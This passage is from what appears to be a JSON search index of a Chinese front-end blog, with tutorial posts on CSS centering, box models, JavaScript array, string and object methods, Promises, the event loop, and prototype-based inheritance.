top: 0;    bottom: 0;    left: 0;    right: 0;    margin: auto;    height: 50px;    width: 70%;    background: #aaa;    color:#222;&#125;\n\n方案七 利用 Flex布局 居中\n&lt;div id=&quot;expample7&quot;&gt;    &lt;div class=&quot;inner&quot;&gt;Content here&lt;/div&gt;&lt;/div&gt;#expample7 &#123;    width: 400px;    height: 100px;    background: #eee;    display: flex;    justify-content: center;    align-items: center;&#125;#expample7 .inner &#123;    height: 50px;    width: 70%;    background: #aaa;    color:#222;&#125;","categories":["前端"],"tags":["css"]},{"title":"标准盒子模型和IE盒子模型","url":"/2018/02/21/html+css+js+ts/2-css-%E6%A0%87%E5%87%86%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B%E5%92%8CIE%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/","content":"标准准盒子模型\n盒子模型是css中一个重要的概念，理解了盒子模型才能更好的排版。其实盒子模型有两种，分别是 ie 盒子模型和标准 w3c 盒子模型。他们对盒子模型的解释各不相同，先来看看我们熟知的标准盒子模型\n\n\n\n从上图可以看到标准 w3c 盒子模型的范围包括 margin、border、padding、content，并且 content部分不包含其他部分\n\n\nIE盒子模型\n\n从上图可以看到 ie盒子模型的范围也包括 margin、border、padding、content\n和标准 w3c 盒子模型不同的是：ie 盒子模型的 content 部分包含了 border和 padding\nIE盒子模型width &#x3D; padding+border+内容\n标准盒子模型 &#x3D; 内容的宽度（不包含border+padding）\n例：\n一个盒子的 margin为 20px，border 为 1px，padding为 10px，content 的宽为 200px、高为 50px，假如用标准 w3c 盒子模型解释，那么这个盒子需要占据的位置为：宽 20*2+1*2+10*2+200=262px、高 20*2+1*2*10*2+50=112px，盒子的实际大小为：宽 1*2+10*2+200=222px、高 1*2+10*2+50=72px；假如用ie 盒子模型，那么这个盒子需要占据的位置为：宽 20*2+200=240px、高 20*2+50=70px，盒子的实际大小为：宽 200px、高 50px\n那应该选择哪中盒子模型呢？当然是“标准 w3c 盒子模型”了。怎么样才算是选择了“标准 w3c盒子模型”呢？很简单，就是在网页的顶部加上 doctype 声明。\n假如不加doctype 声明，那么各个浏览器会根据自己的行为去理解网页，即 ie浏览器会采用 ie 盒子模型去解释你的盒子，而 ff会采用标准 w3c 盒子模型解释你的盒子，所以网页在不同的浏览器中就显示的不一样了。\n反之，假如加上了 doctype 声明，那么所有浏览器都会采用标准 w3c盒子模型去解释你的盒子，网页就能在各个浏览器中显示一致了。\n\n\n\n再用 jquery 做的例子来证实一下\n\n&lt;html&gt;&lt;head&gt;&lt;title&gt;你用的盒子模型是？&lt;/title&gt;&lt;script language=&quot;javascript&quot; src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script language=&quot;javascript&quot;&gt;var sbox = $.boxmodel ? &quot;标准w3c&quot;:&quot;ie&quot;;document.write(&quot;您的页面目前支持：&quot;+sbox+&quot;盒子模型&quot;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n　上面的代码没有加上 doctype 声明，在 ie 浏览器中显示 ie盒子模型，在 ff 浏览器中显示“标准w3c 盒子模型”。\n\n&lt;!doctype html public &quot;-//w3c//dtd xhtml 1.0 transitional//en&quot; &quot;http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;你用的盒子模型是标准w3c盒子模型&lt;/title&gt;&lt;script language=&quot;javascript&quot; src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script language=&quot;javascript&quot;&gt;var sbox = $.boxmodel ? &quot;标准w3c&quot;:&quot;ie&quot;;document.write(&quot;您的页面目前支持：&quot;+sbox+&quot;盒子模型&quot;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n　代码2 与代码1 唯一的不同的就是顶部加了 doctype声明。在所有浏览器中都显示“标准 w3c盒子模型”\n所以为了让网页能兼容各个浏览器，让我们用标准 w3c 盒子模型\n\n","categories":["前端"],"tags":["css"]},{"title":"js-字符串,对象,数组常用方法","url":"/2017/12/11/html+css+js+ts/3-JavaScript%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%81%E5%AF%B9%E8%B1%A1%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/","content":"一、String对象1.1 slice\nstringObject.slice(start, end)\n\nvar a = &#x27;Hello world!&#x27;;var b = a.slice(2);var c = a.slice(-4, -2);// a: &#x27;Hello world!&#x27;// b: &#x27;llo world!&#x27;// c: &#x27;rl&#x27;，参数可为负\n\n1.2 substr\nstringObject.substr(start, length)\n\nvar a = &#x27;Hello world!&#x27;;var b = a.substr(0, 4);var c = a.substr(-5, 2);// a: &#x27;Hello world!&#x27;// b: &#x27;Hell&#x27;// c: &#x27;or&#x27;，参数可为负\n\n1.3 substring\nstringObject.substring(start, stop)\n\nvar a = &#x27;Hello world!&#x27;;var b = a.substring(0, 4);var c = a.substring(3, 2);var d = a.substring(0, -1);// a: &#x27;Hello world!&#x27;// b: &#x27;Hell&#x27;// c: &#x27;l&#x27;，start比stop小，交换这两个参数// d: &#x27;&#x27;，参数为负，返回空字符串\n\n\nslice`、`substr`、`substring`都是字符串的切割方法，三者之间有细微的区别，根据不同的使用场景可以灵活使用。三种方法都是生成新的字符串，而不是修改原`string\n\n二、Array对象2.1 concat\n参数可以为具体的值，也可以为数组对象，可以任意多个。不改变现有的数组，返回被连接数组的一个副本。\n\nvar a = [1, 2, 3];var b = a.concat(4, 5);var c = a.concat([4, 5]);// a: [1, 2, 3]// b: [1, 2, 3, 4, 5]// c: [1, 2, 3, 4, 5]\n\n2.2 pop\n删除 arrayObject 的最后一个元素，把数组长度减 1，并且返回它删除的元素的值。如果数组已经为空，则 pop() 不改变数组，并返回 undefined 值。该方法会改变原数组\n\nvar a = [1, 2, 3];var b = a.pop();// a: [1, 2]，修改了原数组// b: 3，返回删除元素的值\n\n2.3 push\n参数顺序添加到 arrayObject 的尾部，直接修改arrayObject\n\nvar a = [1, 2, 3];var b = a.push(4, 5);// a: [1, 2, 3, 4, 5]，修改了原数组// b: 5，返回修改后的数组的长度\n\n2.4 shift\n把数组的第一个元素从其中删除，并返回第一个元素的值。如果数组是空的，那么 shift() 方法将不进行任何操作，返回undefined值。该方法会改变原数组。类比pop方法\n\nvar a = [1, 2, 3];var b = a.shift();// a: [2, 3]，修改了原数组// b: 1，返回删除元素的值\n\n2.5 unshift\n向数组的开头添加一个或更多元素，并返回新的长度。该方法的第一个参数将成为数组的新元素 0，如果还有第二个参数，它将成为新的元素 1，以此类推\n\nvar a = [1, 2, 3];var b = a.unshift(4, 5);// a: [ 4, 5, 1, 2, 3 ]，修改了原数组// b: 5，返回修改后的数组的长度\n\n2.6 slice\n返回一个新的数组，包含从 start 到 end （不包括该元素）的 arrayObject 中的元素。该方法不会修改原数组\n\nvar a = [1, 2, 3, 4, 5];var b = a.slice(2);// a: [1, 2, 3, 4, 5]，不修改原数组// b: [3, 4, 5]，返回新数组var c = [1, 2, 3, 4, 5];var d = c.slice(2, -1);// c: [1, 2, 3, 4, 5]，不修改原数组// d: [3, 4]，返回新数组\n\n2.7 splice\n可删除从 index 处开始的零个或多个元素，并且用参数列表中声明的一个或多个值来替换那些被删除的元素。如果从 arrayObject 中删除了元素，则返回的是含有被删除的元素的数组。\n\nvar a = [1, 2, 3, 4, 5];var b = a.splice(1, 1);// a: [1, 3, 4, 5]，修改了原数组// b: [2]，返回新数组var c = [1, 2, 3, 4, 5];var d = c.splice(-1, 1);// c: [1, 2, 3, 4]，修改了原数组// d: [5]，返回新数组var e = [1, 2, 3, 4, 5];var f = e.splice(1, 1, 6, 7);// e: [ 1, 6, 7, 3, 4, 5 ]，修改了原数组// f: [2]，返回新数组var g = [1, 2, 3, 4, 5];var h = g.splice(1, 0, 8);// g: [ 1, 8, 2, 3, 4, 5 ]，修改了原数组// h: []，没有删除值，返回空数组\n\n2.8 sort\n无参数时，将按字母顺序对数组中的元素进行排序。参数为比较函数时，如果要交换prev和next的值，返回大于0的值\n\nvar a = [1, 10, 8, 6, 9];var b = a.sort(function (prev, next) &#123;  return prev - next;&#125;);// a: [1, 6, 8, 9, 10]，修改了原数组// b: [1, 6, 8, 9, 10]，返回修改后的数组\n\n2.9 reverse\n用于颠倒数组中元素的顺序。会改变原数组\n\nvar a = [1, 2, 3];var b = a.reverse();// a: [3, 2, 1]，修改了原数组// b: [3, 2, 1]，返回修改后的数组\n\n2.10 map\n有返回值，返回一个新的数组，每个元素为调用func的结果\n\nlet list = [1, 2, 3, 4, 5];let other = list.map((d, i) =&gt; &#123;    return d * 2;&#125;);console.log(other);// print: [2, 4, 6, 8, 10]\n\n2.11 forEach\n数组的每个元素执行一次提供的函数。一般来说不修改原数组，但也可以通过处理函数修改原数组。该方法很灵活，可类比for...of\n没有返回值，只针对每个元素调用func。\n优点：代码简介。\n缺点：无法使用break，return等终止循环\n\n\n\nvalue 当前操作的数组元素\n当前操作元素的数组索引\narray 当前数组的引用\n\n\nlet list = [1, 2, 3, 4, 5];list.forEach((d, i) =&gt; &#123;    this.push(d * 2);&#125;);console.log(other);// print: [2, 4, 6, 8, 10]\n\n2.12 find\n返回数组中第一个满足测试条件（返回true）的元素。如果不存在这样的元素，返回undefined。findIndex类似，只不过返回的是第一个满足测试条件的元素的index\n\nvar a = [1, 2, 3];var b = a.find((curVal) =&gt; curVal === 1);var c = a.find((curVal) =&gt; curVal === 4);// a: [1, 2, 3]，不修改原数组// b: 1// c: undefined\n\n2.13 filter\n返回数组中所有满足测试条件（返回true）的元素组成的数组。如果不存在这样的元素，返回[]\n\nvar a = [1, 2, 3];var b = a.filter((curVal) =&gt; curVal &gt; 1);var c = a.filter((curVal) =&gt; curVal &gt; 3);// a: [1, 2, 3]，不修改原数组// b: [2, 3]// c: []\n\n2.14 reduce和reduceRight\n.reduce从左到右而.reduceRight从右到左循环遍历数组，每次调用接收目前为止的部分结果和当前遍历的值\n\n\n两种方法都有如下典型用法：.reduce(callback(previousValue, currentValue, index, array), initialValue)。\npreviousValue是最后被调用的回调函数的返回值，initialValue是开始时previousValue被初始化的值。currentValue\n是当前被遍历的元素值，index是当前元素在数组中的索引值。array是对调用.reduce数组的简单引用\n\nArray.prototype.sum = function () &#123;    return this.reduce(function (partial, value) &#123;        return partial + value    &#125;, 0)&#125;;[3,4,5,6,10].sum()// &lt;- 28\n\n\n可以使用.reduce作为对象的字符串生成器\n\nfunction concat (input) &#123;    return input.reduce(function (partial, value) &#123;        if (partial) &#123;            partial += &#x27;, &#x27;        &#125;        return partial + value    &#125;, &#x27;&#x27;)&#125;concat([    &#123; name: &#x27;George&#x27; &#125;,    &#123; name: &#x27;Sam&#x27; &#125;,    &#123; name: &#x27;Pear&#x27; &#125;])// &lt;- &#x27;George, Sam, Pear&#x27;\n\n2.15 some\n返回一个boolean，判断是否有元素符合func条件，如果有一个元素符合func条件，则循环会终止\n\nlet list = [1, 2, 3, 4, 5];list.some((d, i) =&gt; &#123;    console.log(d, i);    return d &gt; 3;&#125;);// print: 1,0 2,1 3,2 4,3// return false\n\n2.16 every\n返回一个boolean，判断每个元素是否符合func条件，有一个元素不满足func条件，则循环终止，返回false\n\nlet list = [1, 2, 3, 4, 5];list.every((d, i) =&gt; &#123;    console.log(d, i);    return d &lt; 3;&#125;);// print: 1,0 2,1 3,2// return false\n\n三、Object3.1 for in\nfor-in循环实际是为循环”enumerable“对象而设计的，for in也可以循环数组，但是不推荐这样使用，for–in是用来循环带有字符串key的对象的方法\n\nvar obj = &#123;a:1, b:2, c:3&#125;;for (var prop in obj) &#123;  console.log(&quot;obj.&quot; + prop + &quot; = &quot; + obj[prop]);&#125;// print:  &quot;obj.a = 1&quot; &quot;obj.b = 2&quot; &quot;obj.c = 3&quot;\n\n3.2 for of\nfor of为ES6提供，具有iterator接口，就可以用for of循环遍历它的成员\n\n\nfor of循环可以使用的范围包括数组、Set和Map结构、某些类似数组的对象（比如arguments对象、DOM NodeList对象）、后文的Generator对象，以及字符串\n\n3.2.1 entries\nentries() 返回一个遍历器对象，用来遍历[键名, 键值]组成的数组。对于数组，键名就是索引值；对于Set，键名与键值相同。Map结构的iterator接口，默认就是调用entries方法\n\n3.2.2 keys\nkeys() 返回一个遍历器对象，用来遍历所有的键名。\n\n3.2.3 values\nvalues()返回一个遍历器对象，用来遍历所有的键值。\n\n\n这三个方法调用后生成的遍历器对象，所遍历的都是计算生成的数据结构\n\n// 遍历数组let list = [1, 2, 3, 4, 5];for (let e of list) &#123;    console.log(e);&#125;// print: 1 2 3 4 5// 遍历对象obj = &#123;a:1, b:2, c:3&#125;;for (let key of Object.keys(obj)) &#123;  console.log(key, obj[key]);&#125;// print:  a 1 b 2 c 3//说明：对于普通的对象，for...in循环可以遍历键名，for...of循环会报错。//一种解决方法是，使用Object.keys方法将对象的键名生成一个数组，然后遍历这个数组。// entrieslet arr = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;];for (let pair of arr.entries()) &#123;  console.log(pair);&#125;// [0, &#x27;a&#x27;]// [1, &#x27;b&#x27;]// [2, &#x27;c&#x27;]","categories":["前端"],"tags":["javascript"]},{"title":"ES Promise.all/race","url":"/2018/03/13/html+css+js+ts/3-Promise.allrace/","content":"一、Pomise.all\nPromise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值\n\nlet p1 = new Promise((resolve, reject) =&gt; &#123;  resolve(&#x27;成功了&#x27;)&#125;)let p2 = new Promise((resolve, reject) =&gt; &#123;  resolve(&#x27;success&#x27;)&#125;)let p3 = Promse.reject(&#x27;失败&#x27;)Promise.all([p1, p2]).then((result) =&gt; &#123;  console.log(result)               //[&#x27;成功了&#x27;, &#x27;success&#x27;]&#125;).catch((error) =&gt; &#123;  console.log(error)&#125;)Promise.all([p1,p3,p2]).then((result) =&gt; &#123;  console.log(result)&#125;).catch((error) =&gt; &#123;  console.log(error)      // 失败了，打出 &#x27;失败&#x27;&#125;)\n\n\nPromse.all在处理多个异步处理时非常有用，比如说一个页面上需要等两个或多个ajax的数据回来以后才正常显示，在此之前只显示loading图标\n\n\nPromise.all 里的任务列表[asyncTask(1),asyncTask(2),asyncTask(3)],我们是按照顺序发起的。但是根据结果来说，它们是异步的，互相之间并不阻塞，每个任务完成时机是不确定的，尽管如此，所有任务结束之后，它们的结果仍然是按顺序地映射到resultList里,这样就能和Promise.all里的任务列表。这带来了一个绝大的好处：在前端开发请求数据的过程中，偶尔会遇到发送多个请求并根据请求顺序获取和使用数据的场景，使用Promise.all毫无疑问可以解决这个问题\n\n二、Promise.race()\nPromise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态\n\n\n我们简单看一下例子，返回结果为3，因为我们设置了定时器，第三个Promise执行的最快\n\nPromise.race([  new Promise(function(resolve, reject) &#123;    setTimeout(() =&gt; resolve(1), 1000)  &#125;),  new Promise(function(resolve, reject) &#123;    setTimeout(() =&gt; resolve(2), 100)  &#125;),  new Promise(function(resolve, reject) &#123;    setTimeout(() =&gt; resolve(3), 10)  &#125;)]).then(value =&gt; &#123;  console.log(value) // 3&#125;)let p1 = new Promise((resolve, reject) =&gt; &#123;  setTimeout(() =&gt; &#123;    resolve(&#x27;success&#x27;)  &#125;,1000)&#125;)let p2 = new Promise((resolve, reject) =&gt; &#123;  setTimeout(() =&gt; &#123;    reject(&#x27;failed&#x27;)  &#125;, 500)&#125;)Promise.race([p1, p2]).then((result) =&gt; &#123;  console.log(result)&#125;).catch((error) =&gt; &#123;  console.log(error)  // 打开的是 &#x27;failed&#x27;&#125;)","categories":["前端"],"tags":["javascript"]},{"title":"js 事件执行机制","url":"/2017/12/21/html+css+js+ts/3-js-Event%20Loop/","content":"\njavascript是一门单线程语言，在最新的HTML5中提出了Web-Worker，但javascript是单线程这一核心仍未改变。所以一切javascript版的”多线程”都是用单线程模拟出来的，一切javascript多线程都是纸老虎\n\n一、javascript事件循环\n既然js是单线程，那就像只有一个窗口的银行，客户需要排队一个一个办理业务，同理js任务也要一个一个顺序执行。如果一个任务耗时过长，那么后一个任务也必须等着。那么问题来了，假如我们想浏览新闻，但是新闻包含的超清图片加载很慢，难道我们的网页要一直卡着直到图片完全显示出来？因此聪明的程序员将任务分为两类\n\n\n同步任务\n异步任务\n\n\n当我们打开网站时，网页的渲染过程就是一大堆同步任务，比如页面骨架和页面元素的渲染。而像加载图片音乐之类占用资源大耗时久的任务，就是异步任务。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明\n\n\n\n同步和异步任务分别进入不同的执行”场所”，同步的进入主线程，异步的进入Event Table并注册函数。\n当指定的事情完成时，Event Table会将这个函数移入Event Queue。\n主线程内的任务执行完毕为空，会去Event Queue读取对应的函数，进入主线程执行。\n上述过程会不断重复，也就是常说的Event Loop(事件循环)\n\n\n我们不禁要问了，那怎么知道主线程执行栈为空啊？js引擎存在monitoring process进程，会持续不断的检查主线程执行栈是否为空，一旦为空，就会去Event Queue那里检查是否有等待被调用的函数\n\nlet data = [];$.ajax(&#123;    url:www.javascript.com,    data:data,    success:() =&gt; &#123;        console.log(&#x27;发送成功!&#x27;);    &#125;&#125;)console.log(&#x27;代码执行结束&#x27;);\n\n上面是一段简易的ajax请求代码\n\najax进入Event Table，注册回调函数success。\n执行console.log(‘代码执行结束’)。\najax事件完成，回调函数success进入Event Queue。\n主线程从Event Queue读取回调函数success并执行\n\n二、setTimeout和setInterval2.1 setTimeout大名鼎鼎的setTimeout无需再多言，大家对他的第一印象就是异步可以延时执行，我们经常这么实现延时3秒执行\nsetTimeout(() =&gt; &#123;    console.log(&#x27;延时3秒&#x27;);&#125;,3000)\n\n渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？\nsetTimeout(() =&gt; &#123;    task();&#125;,3000)console.log(&#x27;执行console&#x27;);\n\n\n根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：\n\n//执行console//task()\n\n去验证一下，结果正确！然后我们修改一下前面的代码\nsetTimeout(() =&gt; &#123;    task()&#125;,3000)sleep(10000000)\n\n乍一看其实差不多嘛，但我们把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，说好的延时三秒，为啥现在需要这么长时间啊？\n这时候我们需要重新理解setTimeout的定义。我们先说上述代码是怎么执行的\n\ntask()进入Event Table并注册,计时开始。\n执行sleep函数，很慢，非常慢，计时仍在继续。\n3秒到了，计时事件timeout完成，task()进入Event Queue，但是sleep也太慢了吧，还没执行完，只好等着。\nsleep终于执行完了，task()终于从Event Queue进入了主线程执行。\n\n\n上述的流程走完，我们知道setTimeout这个函数，是经过指定时间后，把要执行的任务(本例中为task())加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。\n\n\n我们还经常遇到setTimeout(fn,0)这样的代码，0秒后执行又是什么意思呢？是不是可以立即执行呢？\n答案是不会的，setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，意思就是不用再等多少秒了，只要主线程执行栈内的同步任务全部执行完成，栈为空就马上执行。举例说明：\n\n//代码1console.log(&#x27;先执行这里&#x27;);setTimeout(() =&gt; &#123;    console.log(&#x27;执行啦&#x27;)&#125;,0);//代码2console.log(&#x27;先执行这里&#x27;);setTimeout(() =&gt; &#123;    console.log(&#x27;执行啦&#x27;)&#125;,3000);\n\n代码1的输出结果是：\n//先执行这里//执行啦\n\n代码2的输出结果是：\n//先执行这里// ... 3s later// 执行啦\n\n\n关于setTimeout要补充的是，即便主线程为空，0毫秒实际上也是达不到的。根据HTML的标准，最低是4毫秒。有兴趣的同学可以自行了解\n\n2.2 setInterval\n上面说完了setTimeout，当然不能错过它的孪生兄弟setInterval。他俩差不多，只不过后者是循环的执行。对于执行顺序来说，setInterval会每隔指定的时间将注册的函数置入Event Queue，如果前面的任务耗时太久，那么同样需要等待\n\n\n唯一需要注意的一点是，对于setInterval(fn,ms)来说，我们已经知道不是每过ms秒会执行一次fn，而是每过ms秒，会有fn进入Event Queue。一旦setInterval的回调函数fn执行时间超过了延迟时间ms，那么就完全看不出来有时间间隔了。这句话请读者仔细品味\n\n三、Promise与process.nextTick(callback)\n传统的定时器我们已经研究过了，接着我们探究Promise与process.nextTick(callback)的表现\n\n\nPromise的定义和功能本文不再赘述，而process.nextTick(callback)类似node.js版的”setTimeout“，在事件循环的下一次循环中调用 callback 回调函数。\n\n我们进入正题，除了广义的同步任务和异步任务，我们对任务有更精细的定义\n\nmacro-task(宏任务)：包括整体代码script，setTimeout，setInterval\nmicro-task(微任务)：Promise，process.nextTick\n\n\n不同类型的任务会进入对应的Event Queue，比如setTimeout和setInterval会进入相同的Event Queue\n\n\n事件循环的顺序，决定js代码的执行顺序。进入整体代码(宏任务)后，开始第一次循环。接着执行所有的微任务。然后再次从宏任务开始，找到其中一个任务队列执行完毕，再执行所有的微任务。听起来有点绕，我们用文章最开始的一段代码说明\n\nsetTimeout(function() &#123;    console.log(&#x27;setTimeout&#x27;);&#125;)new Promise(function(resolve) &#123;    console.log(&#x27;promise&#x27;);&#125;).then(function() &#123;    console.log(&#x27;then&#x27;);&#125;)console.log(&#x27;console&#x27;);\n\n\n这段代码作为宏任务，进入主线程。\n先遇到setTimeout，那么将其回调函数注册后分发到宏任务Event Queue。(注册过程与上同，下文不再描述)\n接下来遇到了Promise，new Promise立即执行，then函数分发到微任务Event Queue。\n遇到console.log()，立即执行。\n好啦，整体代码script作为第一个宏任务执行结束，看看有哪些微任务？我们发现了then在微任务Event Queue里面，执行。\nok，第一轮事件循环结束了，我们开始第二轮循环，当然要从宏任务Event Queue开始。我们发现了宏任务Event Queue中setTimeout对应的回调函数，立即执行。\n结束。\n\n\n事件循环，宏任务，微任务的关系如图所示：\n\n\n\n我们来分析一段较复杂的代码，看看你是否真的掌握了js的执行机制\n\nconsole.log(&#x27;1&#x27;);setTimeout(function() &#123;    console.log(&#x27;2&#x27;);    process.nextTick(function() &#123;        console.log(&#x27;3&#x27;);    &#125;)    new Promise(function(resolve) &#123;        console.log(&#x27;4&#x27;);        resolve();    &#125;).then(function() &#123;        console.log(&#x27;5&#x27;)    &#125;)&#125;)process.nextTick(function() &#123;    console.log(&#x27;6&#x27;);&#125;)new Promise(function(resolve) &#123;    console.log(&#x27;7&#x27;);    resolve();&#125;).then(function() &#123;    console.log(&#x27;8&#x27;)&#125;)setTimeout(function() &#123;    console.log(&#x27;9&#x27;);    process.nextTick(function() &#123;        console.log(&#x27;10&#x27;);    &#125;)    new Promise(function(resolve) &#123;        console.log(&#x27;11&#x27;);        resolve();    &#125;).then(function() &#123;        console.log(&#x27;12&#x27;)    &#125;)&#125;)\n\n第一轮事件循环流程分析如下\n\n整体script作为第一个宏任务进入主线程，遇到console.log，输出1。\n遇到setTimeout，其回调函数被分发到宏任务Event Queue中。我们暂且记为setTimeout1。\n遇到process.nextTick()，其回调函数被分发到微任务Event Queue中。我们记为process1。\n遇到Promise，new Promise直接执行，输出7。then被分发到微任务Event Queue中。我们记为then1。\n又遇到了setTimeout，其回调函数被分发到宏任务Event Queue中，我们记为setTimeout2。\n\n\n\n\n宏任务Event Queue\n微任务Event Queue\n\n\n\nsetTimeout1\nprocess1\n\n\nsetTimeout2\nthen1\n\n\n\n上表是第一轮事件循环宏任务结束时各Event Queue的情况，此时已经输出了1和7。\n我们发现了process1和then1两个微任务。\n执行process1,输出6。\n执行then1，输出8。\n\n\n好了，第一轮事件循环正式结束，这一轮的结果是输出1，7，6，8。那么第二轮时间循环从setTimeout1宏任务开始：\n\n\n首先输出2。接下来遇到了process.nextTick()，同样将其分发到微任务Event Queue中，记为process2。new Promise立即执行输出4，then也分发到微任务Event Queue中，记为then2\n\n\n\n\n宏任务Event Queue\n微任务Event Queue\n\n\n\nsetTimeout2\nprocess2\n\n\n\nthen2\n\n\n\n第二轮事件循环宏任务结束，我们发现有process2和then2两个微任务可以执行。\n输出3。\n输出5。\n第二轮事件循环结束，第二轮输出2，4，3，5。\n第三轮事件循环开始，此时只剩setTimeout2了，执行。\n直接输出9。\n将process.nextTick()分发到微任务Event Queue中。记为process3。\n直接执行new Promise，输出11。\n将then分发到微任务Event Queue中，记为then3。\n\n\n\n\n宏任务Event Queue\n微任务Event Queue\n\n\n\n\nprocess3\n\n\n\nthen3\n\n\n\n第三轮事件循环宏任务执行结束，执行两个微任务process3和then3。\n输出10。\n输出12。\n第三轮事件循环结束，第三轮输出9，11，10，12。\n\n\n整段代码，共进行了三次事件循环，完整的输出为1，7，6，8，2，4，3，5，9，11，10，12。(请注意，node环境下的事件监听依赖libuv与前端环境不完全相同，输出顺序可能会有误差)\n\n四、总结js的异步\n\n我们从最开头就说javascript是一门单线程语言，不管是什么新框架新语法糖实现的所谓异步，其实都是用同步的方法去模拟的，牢牢把握住单线程这点非常重要。\n\n事件循环Event Loop\n\n事件循环是js实现异步的一种方法，也是js的执行机制。\n\njavascript的执行和运行\n\n执行和运行有很大的区别，javascript在不同的环境下，比如node，浏览器，Ringo等等，执行方式是不同的。而运行大多指javascript解析引擎，是统一的。\n\nsetImmediate\n\n微任务和宏任务还有很多种类，比如setImmediate等等，执行都是有共同点的\n\n总结\n\njavascript是一门单线程语言\nEvent Loop是javascript的执行机制\n\n","categories":["前端"],"tags":["javascript","Event Loop"]},{"title":"js-OOP原型与原型链","url":"/2017/12/27/html+css+js+ts/3-js-OOP%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE/","content":"prototype原型对象\n\n每个函数都有一个默认的prototype属性，其实际上还是一个对象，如果被用在继承中，姑且叫做原型对象\n\n在构造函数中的prototype中定义的属性和方法，会被创建的对象所继承下来。举个栗子：\nfunction F()&#123;&#125;F.prototype.work = function()&#123;    console.log(&#x27;F is working..&#x27;);&#125;;var f = new F();f.work(); // F is working..\n\n当你创建函数时，JS会为这个函数自动添加 prototype 属性，值是空对象。而一旦你把这个函数当作构造函数（ constructor ）调用（即通过 new关键字调用），那么JS就会帮你创建该构造函数的实例，实例继承构造函数 prototype 的所有属性和方法（实例通过设置自己的__proto__ 指向构造函数的 prototype 来实现这种继承）\n\n\n神秘的proto\n\nJS的对象中都包含了一个__proto__属性，其指向的是创建该对象时的构造函数的原型对象prototype\n\n\n\n从上面的输出结果看出，f.__proto__指向了其构造函数F的prototype，而F.prototype本身也是一个对象，其内部也有__proto__属性，其指向的是Object.prototype,直到最后Object.prototype指向null，这条原型链才结束\n因此，__proto__这个神秘的属性才是原型链形成的真正原因\n\n原型链\n\n由于原型对象本身也是对象，根据上边的定义，它也有自己的原型，而它自己的原型对象又可以有自己的原型，这样就组成了一条链，这个就是原型链，JavaScritp引擎在访问对象的属性时，如果在对象本身中没有找到，则会去原型链中查找，如果找到，直接返回值，如果整个链都遍历且没有找到属性，则返回undefined。原型链一般实现为一个链表，这样就可以按照一定的顺序来查找\n\n\n\n从上图看出：\nObject.prototype是顶级对象，所有对象都继承自它。\nFunction继承 Function本身， Function.prototype 继承 Object.prototype\nFunction.prototype 和 Function.__proto__ 都指向 Function.prototype\nObject.prototype.__proto__ === null ，说明原型链到 Object.prototype终止\n\n\n\n","categories":["javascript"],"tags":["javascript"]},{"title":"js-OOP面向对象","url":"/2017/12/25/html+css+js+ts/3-js-OOP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","content":"\n一般面向对象包含：继承，封装，多态，抽象\n\n对象形式的继承\n浅拷贝\nvar Person = &#123;    name: &#x27;allin&#x27;,    age: 18,    address: &#123;        home: &#x27;home&#x27;,        office: &#x27;office&#x27;,    &#125;    sclools: [&#x27;x&#x27;,&#x27;z&#x27;],&#125;;var programer = &#123;    language: &#x27;js&#x27;,&#125;;function extend(p, c)&#123;    var c = c || &#123;&#125;;    for( var prop in p)&#123;        c[prop] = p[prop];    &#125;&#125;extend(Person, programer);programer.name;  // allinprogramer.address.home;  // homeprogramer.address.home = &#x27;house&#x27;;  //housePerson.address.home;  // house\n\n\n从上面的结果看出，浅拷贝的缺陷在于修改了子对象中引用类型的值，会影响到父对象中的值，因为在浅拷贝中对引用类型的拷贝只是拷贝了地址，指向了内存中同一个副本\n\n深拷贝\nfunction extendDeeply(p, c)&#123;    var c = c || &#123;&#125;;    for (var prop in p)&#123;        if(typeof p[prop] === &quot;object&quot;)&#123;            c[prop] = (p[prop].constructor === Array)?[]:&#123;&#125;;            extendDeeply(p[prop], c[prop]);        &#125;else&#123;            c[prop] = p[prop];        &#125;    &#125;&#125;\n\n\n利用递归进行深拷贝，这样子对象的修改就不会影响到父对象\n\nextendDeeply(Person, programer);programer.address.home = &#x27;allin&#x27;;Person.address.home; // home\n\n利用call和apply继承\nfunction Parent()&#123;    this.name = &quot;abc&quot;;    this.address = &#123;home: &quot;home&quot;&#125;;&#125;function Child()&#123;    Parent.call(this);    this.language = &quot;js&quot;; &#125;\n\nES5中的Object.create()var p = &#123; name : &#x27;allin&#x27;&#125;;var obj = Object.create(o);obj.name; // allin\n\n\nObject.create()作为new操作符的替代方案是ES5之后才出来的。我们也可以自己模拟该方法：\n\n//模拟Object.create()方法function myCreate(o)&#123;    function F()&#123;&#125;;    F.prototype = o;    o = new F();    return o;&#125;var p = &#123; name : &#x27;allin&#x27;&#125;;var obj = myCreate(o);obj.name; // allin\n\n\n目前，各大浏览器的最新版本（包括IE9）都部署了这个方法。如果遇到老式浏览器，可以用下面的代码自行部署\n\n　if (!Object.create) 